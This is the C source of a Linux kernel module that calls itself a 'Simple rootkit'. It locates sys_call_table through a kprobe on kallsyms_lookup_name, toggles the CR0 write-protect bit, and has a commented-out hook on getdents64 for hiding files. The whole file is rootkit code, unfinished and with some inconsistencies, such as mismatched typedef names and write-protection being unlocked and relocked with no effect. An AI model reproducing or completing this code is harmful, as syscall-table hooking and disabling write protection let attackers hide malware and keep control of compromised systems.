#include <linux/module.h>
#include <linux/kprobes.h>
#include <asm/special_insns.h>

static unsigned long *sys_call_table;

static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

    int ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("register_kprobe failed for %s with ret %d\n", name, ret);
        return 0;
    }

    kallsyms_lookup_name_t kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    unsigned long *sys_call_table = (unsigned long *)kallsyms_lookup_name_ptr(name);
    if (!sys_call_table) {
        pr_err("kallsyms_lookup_name failed for %s with ret %d\n", name, ret);
        return 0;
    }

    return (unsigned long)sys_call_table;
}

// /* Тип оригинального обработчика */
// typedef asmlinkage long (*getdents64_t)(
//     const struct pt_regs *regs);

// static getdents64_t orig_getdents64;

static inline void cr0_write_unlock(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0(cr0);
}

static inline void cr0_write_lock(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}

static inline void write_cr0_forced(unsigned long val)
{
    asm volatile("mov %0, %%cr0" : "+r"(val) : : "memory");
}

static int __init rootkit_init(void)
{
    sys_call_table = (unsigned long *)lookup_name("sys_call_table");
    if (!sys_call_table)
        return -ENXIO;

    pr_info("sys_call_table_addr: %p", sys_call_table);

    //orig_getdents64 = (orig_getdents64_t)sys_call_table[__NR_getdents64];

    cr0_write_unlock();
    cr0_write_lock();
    // write_cr0_forced(read_cr0() & ~0x10000);
    // sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    // write_cr0_forced(read_cr0() | 0x10000);

    return 0;
}

static void __exit rootkit_exit(void) {}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Hacker");
MODULE_DESCRIPTION("Simple rootkit");
